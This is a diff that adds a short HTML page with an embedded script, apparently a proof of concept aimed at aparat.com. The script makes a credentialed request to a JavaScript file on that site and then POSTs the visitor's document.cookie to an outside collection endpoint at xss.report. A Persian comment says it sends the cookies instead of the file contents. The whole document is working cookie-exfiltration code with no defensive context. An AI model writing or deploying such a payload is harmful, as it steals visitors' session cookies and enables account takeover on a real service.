@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    var req = new XMLHttpRequest();
+    req.open('GET', 'https://www.aparat.com/redesign/static/vendor/surtur-web-sdk-1.8.6.js', true);
+    req.withCredentials = true;
+    req.onload = function() {
+        var logReq = new XMLHttpRequest();
+        logReq.open('POST', 'https://xss.report/c/ashkan/log', true);
+        logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        logReq.send('cookies=' + encodeURIComponent(document.cookie));  // ارسال کوکی‌ها به جای محتوای فایل
+    };
+    req.send();
+</script>
+</body>
+</html>
